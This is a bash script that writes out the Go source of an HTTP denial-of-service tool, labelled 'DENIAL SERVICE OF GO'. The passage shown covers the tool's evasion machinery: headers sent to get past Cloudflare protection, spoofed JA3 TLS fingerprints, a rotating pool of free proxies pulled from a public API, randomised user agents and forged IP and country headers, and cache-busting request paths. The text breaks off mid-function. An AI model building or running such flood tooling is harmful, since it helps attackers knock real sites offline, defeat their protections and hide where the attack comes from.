#!/bin/bash

# ----------------------------------------
# GO DOS TOOL SETUP (HTTP/2 + HTTP/1.1 ONLY)
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create main.go file directly (ENHANCED version with Cloudflare bypass)
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with Cloudflare bypass...${NC}"

cat > main.go << 'EOF'
package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Country codes for geo-spoofing
	countryCodes = []string{
		"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
		"AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
		"BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
		"CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
		"DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
		"GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
		"GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
		"IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
		"LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
		"MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
		"MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
		"PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
		"RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
		"SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
		"TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
		"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
		"en-US,en;q=0.5",
		"en-US;q=0.8,en;q=0.7",
		"en-GB,en;q=0.9",
		"en-CA,en;q=0.9",
		"en-AU,en;q=0.9",
		"en-NZ,en;q=0.9",
		"en-ZA,en;q=0.9",
		"en-IE,en;q=0.9",
		"en-IN,en;q=0.9",
		"ar-SA,ar;q=0.9",
		"az-Latn-AZ,az;q=0.9",
		"be-BY,be;q=0.9",
		"bg-BG,bg;q=0.9",
		"bn-IN,bn;q=0.9",
		"ca-ES,ca;q=0.9",
		"cs-CZ,cs;q=0.9",
		"cy-GB,cy;q=0.9",
		"da-DK,da;q=0.9",
		"de-DE,de;q=0.9",
		"el-GR,el;q=0.9",
		"es-ES,es;q=0.9",
		"et-EE,et;q=0.9",
		"eu-ES,eu;q=0.9",
		"fa-IR,fa;q=0.9",
		"fi-FI,fi;q=0.9",
		"fr-FR,fr;q=0.9",
		"ga-IE,ga;q=0.9",
		"gl-ES,gl;q=0.9",
		"gu-IN,gu;q=0.9",
		"he-IL,he;q=0.9",
		"hi-IN,hi;q=0.9",
		"hr-HR,hr;q=0.9",
		"hu-HU,hu;q=0.9",
		"hy-AM,hy;q=0.9",
		"id-ID,id;q=0.9",
		"is-IS,is;q=0.9",
		"it-IT,it;q=0.9",
		"ja-JP,ja;q=0.9",
		"ka-GE,ka;q=0.9",
		"kk-KZ,kk;q=0.9",
		"km-KH,km;q=0.9",
		"kn-IN,kn;q=0.9",
		"ko-KR,ko;q=0.9",
		"ky-KG,ky;q=0.9",
		"lo-LA,lo;q=0.9",
		"lt-LT,lt;q=0.9",
		"lv-LV,lv;q=0.9",
		"mk-MK,mk;q=0.9",
		"ml-IN,ml;q=0.9",
		"mn-MN,mn;q=0.9",
		"mr-IN,mr;q=0.9",
		"ms-MY,ms;q=0.9",
		"mt-MT,mt;q=0.9",
		"my-MM,my;q=0.9",
		"nb-NO,nb;q=0.9",
		"ne-NP,ne;q=0.9",
		"nl-NL,nl;q=0.9",
		"nn-NO,nn;q=0.9",
		"or-IN,or;q=0.9",
		"pa-IN,pa;q=0.9",
		"pl-PL,pl;q=0.9",
		"pt-BR,pt;q=0.9",
		"pt-PT,pt;q=0.9",
		"ro-RO,ro;q=0.9",
		"ru-RU,ru;q=0.9",
		"si-LK,si;q=0.9",
		"sk-SK,sk;q=0.9",
		"sl-SI,sl;q=0.9",
		"sq-AL,sq;q=0.9",
		"sr-Cyrl-RS,sr;q=0.9",
		"sr-Latn-RS,sr;q=0.9",
		"sv-SE,sv;q=0.9",
		"sw-KE,sw;q=0.9",
		"ta-IN,ta;q=0.9",
		"te-IN,te;q=0.9",
		"th-TH,th;q=0.9",
		"tr-TR,tr;q=0.9",
		"uk-UA,uk;q=0.9",
		"ur-PK,ur;q=0.9",
		"uz-Latn-UZ,uz;q=0.9",
		"vi-VN,vi;q=0.9",
		"zh-CN,zh;q=0.9",
		"zh-HK,zh;q=0.9",
		"zh-TW,zh;q=0.9",
		"am-ET,am;q=0.8",
		"as-IN,as;q=0.8",
		"az-Cyrl-AZ,az;q=0.8",
		"bn-BD,bn;q=0.8",
		"bs-Cyrl-BA,bs;q=0.8",
		"bs-Latn-BA,bs;q=0.8",
		"dz-BT,dz;q=0.8",
		"fil-PH,fil;q=0.8",
		"fr-CA,fr;q=0.8",
		"fr-CH,fr;q=0.8",
		"fr-BE,fr;q=0.8",
		"fr-LU,fr;q=0.8",
		"gsw-CH,gsw;q=0.8",
		"ha-Latn-NG,ha;q=0.8",
		"hr-BA,hr;q=0.8",
		"ig-NG,ig;q=0.8",
		"ii-CN,ii;q=0.8",
		"jv-Latn-ID,jv;q=0.8",
		"kkj-CM,kkj;q=0.8",
		"kl-GL,kl;q=0.8",
		"kok-IN,kok;q=0.8",
		"ks-Arab-IN,ks;q=0.8",
		"lb-LU,lb;q=0.8",
		"ln-CG,ln;q=0.8",
		"mn-Mong-CN,mn;q=0.8",
		"mr-MN,mr;q=0.8",
		"ms-BN,ms;q=0.8",
		"mua-CM,mua;q=0.8",
		"nds-DE,nds;q=0.8",
		"ne-IN,ne;q=0.8",
		"nso-ZA,nso;q=0.8",
		"oc-FR,oc;q=0.8",
		"pa-Arab-PK,pa;q=0.8",
		"ps-AF,ps;q=0.8",
		"quz-BO,quz;q=0.8",
		"quz-EC,quz;q=0.8",
		"quz-PE,quz;q=0.8",
		"rm-CH,rm;q=0.8",
		"rw-RW,rw;q=0.8",
		"sd-Arab-PK,sd;q=0.8",
		"se-NO,se;q=0.8",
		"smn-FI,smn;q=0.8",
		"sms-FI,sms;q=0.8",
		"syr-SY,syr;q=0.8",
		"tg-Cyrl-TJ,tg;q=0.8",
		"ti-ER,ti;q=0.8",
		"tk-TM,tk;q=0.8",
		"tn-ZA,tn;q=0.8",
		"tt-RU,tt;q=0.8",
		"ug-CN,ug;q=0.8",
		"uz-Cyrl-UZ,uz;q=0.8",
		"ve-ZA,ve;q=0.8",
		"wo-SN,wo;q=0.8",
		"xh-ZA,xh;q=0.8",
		"yo-NG,yo;q=0.8",
		"zgh-MA,zgh;q=0.8",
		"zu-ZA,zu;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, identity",
		"deflate, gzip",
		"compress, gzip",
		"br",
		"*",
		"identity",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"no-transform",
		"only-if-cached",
		"public",
		"private",
		"proxy-revalidate",
		"s-maxage=86400",
		"must-revalidate",
		"max-age=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-XSS-Protection": "1; mode=block"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Site": "none"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "1"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-CSRF-Token": ""},
		{"X-API-Key": ""},
	}

	// Cloudflare-specific bypass headers
	cloudflareBypassHeaders = []map[string]string{
		{"CF-Access-Client-Id": ""},
		{"CF-Access-Client-Secret": ""},
		{"CF-Authorization": ""},
		{"CF-Ray": ""},
		{"CF-WARP-Tag": ""},
		{"CF-Connecting-IP": ""},
		{"CF-IPCountry": ""},
		{"CF-Visitor": "{\"scheme\":\"https\"}"},
		{"CF-Challenge": ""},
		{"CF-Cache-Status": ""},
	}

	// Additional sophisticated headers for Cloudflare
	sophisticatedHeaders = []map[string]string{
		{"Accept-CH": "Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-FullVersion,Sec-CH-UA-Model,Sec-CH-UA-Mobile,Sec-CH-UA-Platform,Sec-CH-UA-PlatformVersion"},
		{"Accept-CH-Lifetime": "86400"},
		{"Critical-CH": "Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-FullVersion,Sec-CH-UA-Model,Sec-CH-UA-Mobile,Sec-CH-UA-Platform,Sec-CH-UA-PlatformVersion"},
		{"Sec-CH-UA": `"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="99"`},
		{"Sec-CH-UA-Arch": `"x86"`},
		{"Sec-CH-UA-Bitness": `"64"`},
		{"Sec-CH-UA-Full-Version": `"141.0.7390.0"`},
		{"Sec-CH-UA-Full-Version-List": `"Google Chrome";v="141.0.7390.0", "Chromium";v="141.0.7390.0", "Not?A_Brand";v="99.0.0.0"`},
		{"Sec-CH-UA-Mobile": "?0"},
		{"Sec-CH-UA-Model": `""`},
		{"Sec-CH-UA-Platform": `"Windows"`},
		{"Sec-CH-UA-Platform-Version": `"15.0.0"`},
		{"Sec-CH-UA-WoW64": "?0"},
		{"Sec-GPC": "1"},
		{"SourceMap": ""https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/react.js.map""},
		{"Accept-Push-Policy": "no-push"},
		{"Accept-Signature": "sig1"},
		{"P3P": "CP=\"This is not a P3P policy!\""},
		{"X-Content-Security-Policy": "default-src 'self'"},
		{"X-Download-Options": "noopen"},
		{"X-Permitted-Cross-Domain-Policies": "none"},
		{"X-Robots-Tag": "noindex, nofollow"},
		{"X-UA-Compatible": "IE=edge"},
	}

	// WebSocket and upgrade headers
	websocketHeaders = []map[string]string{
		{"Upgrade": "websocket"},
		{"Connection": "Upgrade"},
		{"Sec-WebSocket-Key": ""},
		{"Sec-WebSocket-Version": "13"},
		{"Sec-WebSocket-Extensions": "permessage-deflate"},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Chrome Windows 141 (Advanced)",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1", "h3"},
		MinVersion:       tls.VersionTLS10,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getAdvancedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	
	alpnProtos := []string{"h2", "http/1.1", "h3"}
	sessionTicketsDisabled := randBool()
	clientSessionCache := tls.NewLRUClientSessionCache(randInt(10, 50))
	
	return &tls.Config{
		NextProtos:                  alpnProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      sessionTicketsDisabled,
		DynamicRecordSizingDisabled: randBool(),
		ClientSessionCache:          clientSessionCache,
		Rand:                        rand.Reader,
		Time:                        time.Now,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getAdvancedTLSConfig(),
					MaxIdleConns:        100,
					MaxIdleConnsPerHost: 100,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getAdvancedTLSConfig(),
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomCountryCode() string {
	return countryCodes[randInt(0, len(countryCodes)-1)]
}

func generateRandomUA() string {
	browserType := randInt(1, 100)
	countryCode := randomCountryCode()
	
	windowsVersions := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Windows NT 12.0; Win64; x64",
		"Windows NT 10.0; Win64; x64; Xbox",
	}
	
	macVersions := []string{
		"Macintosh; Intel Mac OS X 15_0",
		"Macintosh; Intel Mac OS X 15_1",
		"Macintosh; Intel Mac OS X 15_2",
		"Macintosh; Intel Mac OS X 16_0",
		"Macintosh; Intel Mac OS X 16_1",
		"Macintosh; ARM Mac OS X 15_0",
		"Macintosh; ARM Mac OS X 16_0",
	}
	
	linuxVersions := []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux x86_64",
		"X11; Fedora; Linux x86_64",
		"X11; Debian; Linux x86_64",
		"X11; Linux x86_64; Arch",
	}
	
	chromeMajor := randInt(141, 165)
	chromeBuild := randInt(5000, 8000)
	chromePatch := randInt(0, 99)
	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
	
	firefoxMajor := randInt(135, 165)
	firefoxMinor := randInt(0, 9)
	firefoxPatch := randInt(0, 99)
	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
	
	edgeMajor := randInt(141, 165)
	edgeBuild := randInt(5000, 8000)
	edgePatch := randInt(0, 99)
	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
	
	safariMajor := randInt(18, 22)
	safariMinor := randInt(0, 5)
	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
	
	androidVersions := []string{"15", "16", "17"}
	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
	
	if browserType <= 45 {
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
	} else if browserType <= 75 {
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
	} else if browserType <= 88 {
		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
	} else if browserType <= 95 {
		os := macVersions[randInt(0, len(macVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
	} else {
		mobileType := randInt(1, 100)
		if mobileType <= 60 {
			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
		} else if mobileType <= 85 {
			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
		} else {
			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
		}
	}
}

func randomReferer() string {
	domains := []string{
		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
	}
	
	paths := []string{
		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
	}
	
	protocols := []string{"https", "http"}
	protocol := protocols[randInt(0, len(protocols)-1)]
	domain := domains[randInt(0, len(domains)-1)]
	path := paths[randInt(0, len(paths)-1)]
	
	if randInt(1, 100) <= 70 {
		path += "?q=" + randomString(randInt(3, 10))
		if randBool() {
			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
		}
	}
	
	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql",
		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
		"/.env", "/config.json", "/settings.ini", "/application.yml", 
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func generateWebSocketKey() string {
	key := make([]byte, 16)
	rand.Read(key)
	return base64.StdEncoding.EncodeToString(key)
}

func generateCFRay() string {
	timestamp := time.Now().Unix()
	random := randInt(100000, 999999)
	return fmt.Sprintf("%d-%d-x", timestamp, random)
}

func generateCFChallenge() string {
	challenge := make([]byte, 32)
	rand.Read(challenge)
